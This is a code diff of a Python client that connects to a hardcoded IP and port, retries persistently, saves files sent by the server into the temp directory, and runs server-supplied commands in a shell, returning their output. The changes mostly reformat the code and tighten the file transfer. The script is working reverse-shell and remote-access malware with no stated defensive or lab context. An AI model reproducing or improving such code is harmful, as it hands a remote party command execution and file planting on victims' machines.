@@ -4,6 +4,7 @@ import tempfile
 import os
 import subprocess
 
+
 def connect(server_ip, server_port):
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     connected_once = False
@@ -20,47 +21,53 @@ def connect(server_ip, server_port):
             else:
                 print("Connection refused. Retrying in 7 seconds...")
                 client_socket.close()
-                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                client_socket = socket.socket(
+                    socket.AF_INET, socket.SOCK_STREAM)
                 time.sleep(7)
                 continue
         except (BrokenPipeError, ConnectionResetError, OSError) as e:
-                print(f"{type(e).__name__} Connection lost. Retrying in 7 seconds...")
-                client_socket.close()
-                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                time.sleep(7)
-                continue
+            print(f"{type(e).__name__} Connection lost. Retrying in 7 seconds...")
+            client_socket.close()
+            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            time.sleep(7)
+            continue
+
 
 def receive_file(client_socket):
-    name = ""
+    name_bytes = b''
     while True:
-        print("Receiving data...")
-        data = client_socket.recv(4096).decode()
-        print(f"Received data: {data}")
-        if "\n" in data:
-            name += data.split("\n")[0]
-            file_data = data.split("\n", 1)[1].encode()
+        chunk = client_socket.recv(1)
+        if chunk == b'\n':
             break
-        name += data
+        name_bytes += chunk
+    name = name_bytes.decode()
+
+    file_data = b''
     while True:
-        data = client_socket.recv(4096)
-        if data.endswith(b"EOF"):
-            file_data += data[:-3]
+        chunk = client_socket.recv(4096)
+        file_data += chunk
+        if file_data.endswith(b"EOF"):
+            print(f"Received data: {name}")
+            file_data = file_data[:-3]
             break
-        file_data += data
+
     temp_dir = tempfile.gettempdir()
-    print(f"Saving file to {temp_dir}")
     file_path = os.path.join(temp_dir, name)
-    with open(file_path, "wb") as file:
-        file.write(file_data)
+    with open(file_path, "wb") as f:
+        f.write(file_data)
+
 
 def send_shell(client_socket, command):
-    output = subprocess.run(command, shell=True, capture_output=True, text=True)
+    output = subprocess.run(command, shell=True,
+                            capture_output=True, text=True)
     client_socket.send(output.stdout.encode('utf-8'))
+
 
 def receive_data(client_socket):
     try:
         while True:
-            data_rec = client_socket.recv(4096).decode()
+            data_rec = client_socket.recv(1024).decode()
+            print(data_rec)
             flag = data_rec.split("\n")[0]
 
             if flag == "FILE":
@@ -75,5 +82,7 @@ def main():
     server_ip = '192.168.0.158'
     server_port = 12345
     connect(server_ip, server_port)
+
+
 if __name__ == "__main__":
     main()
